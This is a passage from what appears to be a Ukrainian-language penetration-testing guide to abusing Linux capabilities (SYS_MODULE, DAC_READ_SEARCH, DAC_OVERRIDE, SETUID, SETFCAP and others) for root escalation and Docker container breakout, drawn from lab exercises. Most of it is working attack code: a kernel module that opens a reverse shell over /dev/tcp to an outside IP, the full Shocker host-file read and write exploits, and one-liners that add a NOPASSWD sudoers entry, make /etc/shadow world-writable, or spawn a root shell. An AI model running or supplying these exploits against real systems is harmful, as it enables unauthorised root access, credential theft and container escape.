Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі видно, що capability **SYS_MODULE** увімкнено.<sup>[[14]](#references)</sup>

**Створіть** **kernel module**, який виконуватиме **reverse shell**, і **Makefile** для його **компіляції**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Порожній символ перед кожним словом `make` у Makefile **має бути табуляцією, а не пробілами**!

Виконайте `make`, щоб скомпілювати його.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Нарешті, запустіть `nc` всередині shell і **завантажте модуль** з іншого — ви захопите shell у процесі nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Код цієї техніки було скопійовано з лабораторної роботи "Abusing SYS_MODULE Capability" від** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Інший приклад цієї техніки можна знайти на [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дозволяє процесу **обходити дозволи на читання файлів, а також на читання та виконання каталогів**. Вона також надає доступ до `open_by_handle_at(2)`, який інтерпретує дійсний файловий дескриптор відносно файлового дескриптора монтування для тієї самої змонтованої файлової системи. Вона не відкриває автоматично доступ до кожного файлу за межами mount namespace процесу. Для breakout за допомогою файлового дескриптора додатково потрібні релевантне для host посилання на файлову систему, дійсні або доступні для виявлення дескриптори, сумісна файлова система та структура сховища, а також відсутність блокування з боку runtime або LSM. Історична техніка Docker "Shocker" демонструвала таку комбінацію в уразливих конфігураціях, як проаналізовано [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Це означає, що можна обходити перевірки дозволів на читання файлів і перевірки дозволів на читання та виконання каталогів**.<sup>[[14]](#references)</sup>

**Приклад із binary**

Binary може читати файли, доступні в його namespaces. Отже, якщо такий файл, як `tar`, має цю capability, він може прочитати shadow-файл:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Приклад із binary2**

У цьому випадку припустімо, що бінарний файл **`python`** має цю capability. Щоб переглянути список root-файлів, можна виконати:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
А щоб прочитати файл, можна виконати:
```python
print(open("/etc/shadow", "r").read())
```
**Приклад у Environment (Docker breakout)**

Ви можете перевірити увімкнені capabilities усередині Docker-контейнера за допомогою `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі видно, що capability **DAC_READ_SEARCH** увімкнено. Вона обходить перевірки DAC для читання/пошуку та дозволяє виклик `open_by_handle_at(2)`; сама по собі це не capability для налагодження процесів.<sup>[[14]](#references)</sup>

Дізнатися, як працює наведений нижче exploit, можна у [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), але коротко: **CAP_DAC_READ_SEARCH** дозволяє переміщатися файловою системою без перевірок дозволів і викликати `open_by_handle_at(2)`; це може розкрити файли, відкриті іншими процесами, якщо відповідні namespaces і mounts доступні.<sup>[[13]](#references)[[14]](#references)</sup>

Оригінальний exploit, який використовує ці дозволи для читання файлів із хоста, можна знайти тут: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); нижче наведено **модифіковану версію, яка дозволяє передати файл для читання як перший аргумент і записати результат у файл**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit має знайти вказівник на щось, змонтоване на host. Оригінальний exploit використовував файл /.dockerinit, а ця модифікована версія використовує /etc/hostname. Якщо exploit не працює, можливо, потрібно вказати інший файл. Щоб знайти файл, змонтований у host, просто виконайте команду mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit має знайти вказівник на щось, змонтоване на host. Оригінальний exploit використовував файл /.dockerinit, а ця модифікована версія використовує...](<../../images/image (407) (1).png>)

**Code цієї technique скопійовано з лабораторної роботи "Abusing DAC_READ_SEARCH Capability" із** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Ця capability обходить перевірки дозволів на читання та запис файлів, а також більшість перевірок на виконання**; для виконання звичайного файлу все одно потрібно, щоб було встановлено принаймні один біт виконання. Вона не обходить монтування лише для читання, незмінний стан або заборону LSM.<sup>[[14]](#references)</sup>

Шукайте файли, які стають доступними для читання або запису через членство у привілейованій групі; корисні цілі залежать від власника та бітів режиму доступу цілі.<sup>[[14]](#references)</sup>

**Приклад із binary**

У цьому прикладі vim має цю capability, тому ви можете змінити будь-який файл, наприклад _passwd_, _sudoers_ або _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Приклад із binary 2**

У цьому прикладі **`python`** binary матиме цю capability. За допомогою python можна перезаписати будь-який файл:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Приклад із середовищем + CAP_DAC_READ_SEARCH (Docker breakout)**

Підтвердьте `CAP_DAC_OVERRIDE` за допомогою `capsh --print`, як показано в попередньому прикладі середовища `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Перш за все, прочитайте попередній розділ, який [**зловживає можливістю DAC_READ_SEARCH для читання довільних файлів**](linux-capabilities.md#cap_dac_read_search) хоста, і **скомпілюйте** exploit.\
Потім **скомпілюйте наведену нижче версію exploit shocker**, яка дасть змогу **записувати довільні файли** у файлову систему хоста:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Щоб **втекти з docker container**, можна **завантажити** файли `/etc/shadow` і `/etc/passwd` з host, **додати** до них **нового користувача** та використати **`shocker_write`**, щоб перезаписати їх. Потім **отримати доступ** через **ssh**.

**Код цієї техніки було скопійовано з лабораторної роботи "Abusing DAC_OVERRIDE Capability" на сайті** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Ця capability дозволяє процесу змінювати власника файлів**.<sup>[[14]](#references)</sup>

**Приклад із binary**

Припустімо, що **`python`** binary має цю capability; ви можете змінити власника такого файлу, як **`shadow`**, а потім використати отриманий доступ, щоб змінити його, якщо інші дозволи це дозволяють:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Або з бінарним файлом **`ruby`**, якому надано цю capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Ця capability обходить перевірки власника для багатьох операцій із файлами, зокрема для зміни дозволів**.<sup>[[14]](#references)</sup>

**Приклад із binary**

Якщо python має цю capability, ви можете змінити дозволи файлу shadow, **змінити пароль root** і підвищити привілеї:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Ця capability дозволяє процесу змінювати свій ефективний ідентифікатор користувача відповідно до правил облікових даних і capability, які застосовує kernel**.<sup>[[14]](#references)</sup>

**Приклад із binary**

Якщо python має цю **capability**, її можна дуже легко використати для privilege escalation до root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Інший спосіб:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Ця capability дозволяє процесу змінювати свій ефективний ідентифікатор групи відповідно до правил щодо облікових даних і capability, які застосовує kernel**.<sup>[[14]](#references)</sup>

Існує багато файлів, які можна **перезаписати для ескалації привілеїв,** [**ідеї можна знайти тут**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Приклад із binary**

У цьому випадку слід шукати цікаві файли, які група може читати, оскільки ви можете видати себе за будь-яку групу:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Після того як ви знайдете файл, який можна використати (через читання або запис) для підвищення привілеїв, ви можете **отримати shell, імітуючи потрібну групу**, за допомогою:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
У цьому випадку було виконано impersonation групи shadow, тому можна прочитати файл `/etc/shadow`:
```bash
cat /etc/shadow
```
### Комбінований ланцюжок: CAP_SETGID + CAP_CHOWN

Коли обидві capabilities доступні в одному helper, практичний ланцюжок має такий вигляд:

1. Перемкнути EGID на `shadow` (або іншу привілейовану групу).
2. Використати `chown` для `/etc/shadow`, щоб призначити свій UID, зберігши групу `shadow`.
3. Прочитати цільовий hash і виконати crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Це усуває потребу безпосередньо отримувати повні root-привілеї та зазвичай достатньо для pivot через повторне використання облікових даних.

Якщо встановлено **docker**, можна **impersonate** групу **docker** і зловживати нею для взаємодії з [**docker socket and escalate privileges**](#writable-docker-socket).

## CAP_SETFCAP

**Ця capability дозволяє процесу встановлювати file capabilities**.<sup>[[14]](#references)</sup>

**Приклад із binary**

Якщо python має цю **capability**, нею можна дуже легко зловживати для підвищення привілеїв до root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Новий записаний набір capabilities замінює попередній набір; якщо після цього helper буде виконано лише з новими capabilities, він може більше не зберігати `CAP_SETFCAP` для оновлення іншого файлу.<sup>[[14]](#references)[[25]](#references)</sup>

Отримавши [можливість SETUID](linux-capabilities.md#cap_setuid), можна перейти до відповідного розділу, щоб дізнатися, як підвищити привілеї.

**Приклад із environment (Docker breakout)**

Задокументований стандартний набір capabilities у Docker містить **CAP_SETFCAP**, але фактичний набір залежить від конфігурації runtime.<sup>[[19]](#references)</sup>
Перевірити capabilities процесу можна за допомогою:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Ця capability дає змогу записувати capabilities файлів, але сама по собі не надає ці capabilities поточному процесу й не обходить правила файлу, bounding-set і namespace, застосовані під час виконання файлу.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Дозволені для файлу capabilities обмежуються capability bounding set процесу, а effective bit файлу визначає, чи буде дозволений набір файлу додано до effective set процесу. Саме тому додавання capabilities до файлу не робить автоматично кожну запитувану capability доступною під час виконання.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) надає низку чутливих можливостей, зокрема доступ до `/dev/mem`, `/dev/kmem` або `/proc/kcore`, зміну `mmap_min_addr`, доступ до системних викликів `ioperm(2)` і `iopl(2)`, а також виконання різних дискових команд. Capability також вмикає `FIBMAP ioctl(2)`, що спричиняло проблеми в [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Згідно з man page, це також дає власнику змогу виконувати низку специфічних для пристрою операцій на інших пристроях.<sup>[[14]](#references)</sup>

Це може бути корисним для **privilege escalation** і **Docker breakout**.<sup>[[14]](#references)</sup>

Сама capability не надає корисного інтерфейсу. Для breakout з контейнера додатково потрібні доступний пристрій або ресурс хоста, дозволи device-cgroup і файлової системи, а також техніка, специфічна для апаратного забезпечення та kernel. Обмеження доступу до `/dev/mem`, kernel lockdown, virtualization, seccomp і політики LSM зазвичай усувають типові шляхи. Спочатку перевірте capability та її доступність:
```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
Якщо `/dev/mem` є затвердженим інтерфейсом, одноразове лабораторне середовище може продемонструвати розкриття пам’яті вузла між межами, зчитуючи та хешуючи діапазон, вибраний із апаратної карти цього лабораторного середовища:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Не вгадуйте діапазон: читання деяких MMIO-регіонів може мати побічні ефекти, а дійсна адреса на одній платформі може керувати обладнанням або пам’яттю ядра на іншій. Для модифікації пам’яті ядра або керування пристроями потрібен затверджений, специфічний для платформи proof; безпечного універсального прикладу необробленого запису не існує.

## CAP_KILL

**Ця capability обходить перевірки дозволів для надсилання сигналів процесам у випадках, визначених ядром**.<sup>[[14]](#references)</sup>

**Приклад із binary**

Припустімо, що binary **`python`** має цю capability. Якщо ви також могли б **змінити конфігурацію певного сервісу або socket** (або будь-який конфігураційний файл, пов’язаний із сервісом), ви могли б встановити в ньому backdoor, а потім завершити процес, пов’язаний із цим сервісом, і дочекатися виконання нового конфігураційного файла з вашим backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Якщо у вас є kill capabilities і **node program running as root** (або від імені іншого користувача), ви, ймовірно, можете **send** йому **signal SIGUSR1**, щоб змусити його **open the node debugger**, до якого ви зможете підключитися.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Ця capability дозволяє прив’язуватися до Internet-портів із номерами нижче 1024.** Вона безпосередньо не надає ширших можливостей для privilege escalation.<sup>[[14]](#references)</sup>

**Приклад із binary**

Якщо **`python`** має цю capability, він зможе прослуховувати будь-який порт і навіть підключатися з нього до будь-якого іншого порту (деякі сервіси вимагають підключень із портів із певними privileges)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дозволяє процесам **створювати RAW- і PACKET-сокети**, що дає їм змогу генерувати та надсилати довільні мережеві пакети. Це може створювати ризики для безпеки в контейнеризованих середовищах, зокрема підроблення пакетів, ін'єкцію трафіку та обхід засобів контролю мережевого доступу. Зловмисники можуть скористатися цим для втручання в маршрутизацію контейнера або порушення безпеки мережі хоста, особливо за відсутності належного захисту firewall. Крім того, **CAP_NET_RAW** підтримує такі операції, як ping за допомогою RAW ICMP-запитів.<sup>[[14]](#references)</sup>

**Це може забезпечити перехоплення пакетів за допомогою відповідного socket interface.** Воно не надає безпосередньо ширших можливостей для підвищення привілеїв.<sup>[[14]](#references)</sup>

**Приклад із binary**

Якщо binary **`tcpdump`** має цю capability, ви зможете використовувати його для захоплення мережевої інформації.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Якщо **середовище** надає цю capability, **`tcpdump`** також може використовувати її для sniffing трафіку.<sup>[[14]](#references)</sup>

**Приклад із бінарним файлом 2**

Наступний приклад містить код **`python2`**, який може бути корисним для перехоплення трафіку інтерфейсу "**lo**" (**localhost**). Код взято з лабораторної роботи "_The Basics: CAP-NET_BIND + NET_RAW_" на [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) надає власнику можливість **змінювати мережеві конфігурації**, зокрема налаштування firewall, таблиці маршрутизації, дозволи сокетів і налаштування мережевих інтерфейсів у поточному network namespace. Він також може вмикати promiscuous mode на інтерфейсі в цьому namespace; це може розкрити трафік, доставлений до цього інтерфейсу, але саме по собі не дозволяє sniffing довільних інтерфейсів в інших network namespaces.<sup>[[14]](#references)</sup>

Ці операції впливають на **поточний network namespace** процесу. Для керування мережевим станом host потрібні `--network=host`, Kubernetes `hostNetwork: true` або окремий примітив для входу в namespace. Сама по собі `CAP_NET_RAW` не є універсальним host shell, але вона брала участь у задокументованому protocol-specific escape: історичний ланцюжок GCE поєднував root, network namespace host, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext metadata traffic і вразливий до race guest-agent request для ін’єкції SSH key. Дивіться [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html), щоб ознайомитися з повними prerequisites і сучасними застереженнями щодо HTTPS metadata.

**Приклад із binary**

Припустімо, що **python binary** має такі capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Ця capability дає змогу змінювати inode flags, як-от immutable і append-only.** Вона не надає безпосередньо ширших можливостей для privilege escalation.<sup>[[14]](#references)</sup>

**Приклад із binary**

Якщо ви виявите, що файл має immutable attribute, а python має цю capability, ви можете **видалити immutable attribute і зробити файл доступним для модифікації:**
```python
#Check that the file is imutable
